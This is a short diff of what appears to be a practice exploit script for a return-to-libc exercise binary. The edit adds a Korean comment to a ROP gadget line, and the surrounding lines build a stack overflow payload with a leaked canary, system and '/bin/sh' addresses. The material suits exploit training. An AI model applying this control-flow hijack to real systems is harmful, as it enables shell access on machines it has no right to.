@@ -22,7 +22,7 @@ slog('Canary: ', canary)
 plt_system = p64(0x4005d0)
 binsh = p64(0x400874)
 pop_rdi = p64(0x400853) # ROPgadget --binary=./rtl --re "pop rdi"
-ret = p64(0x400596) # ROPgadget --binary=./rtl | grep ": ret"
+ret = p64(0x400596) # ROPgadget --binary=./rtl | grep ": ret", 실행마다 바뀔 수 있으니 명령어 실행 후 나온 값으로 대치해 준다.
 
 payload = b'A'*0x38 + p64(canary) + b'B'*0x8
 payload += ret
